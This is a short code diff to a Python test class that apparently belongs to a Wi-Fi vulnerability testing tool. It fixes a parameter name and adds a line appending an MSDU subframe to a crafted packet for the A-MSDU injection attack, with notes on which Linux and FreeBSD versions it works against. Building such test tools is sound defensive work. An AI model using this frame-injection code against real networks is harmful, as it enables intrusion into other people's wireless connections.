@@ -6,7 +6,7 @@ class AmsduInject(Test):
 	the A-MSDU attack by injecting an IP packet with a specific identification field.
 	"""
 
-	def __init__(self, ptype, Target=False):
+	def __init__(self, ptype, target=False):
 		super().__init__([Action(Action.Connected, Action.Inject, enc=True)])
 		self.ptype = ptype
 		self.target = target
@@ -35,7 +35,7 @@ class AmsduInject(Test):
 		# This works against linux 4.9 and above and against FreeBSD
 		elif self.target == "linux":
 			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="3.5.1.1")/TCP()/Raw(b"A" * 748)
-
+		p = p/create_msdu_subframe(src, dst, request, last=True)
 		p[Dot11QoS].Reserved = 1
 
 		# Schedule transmission of frame
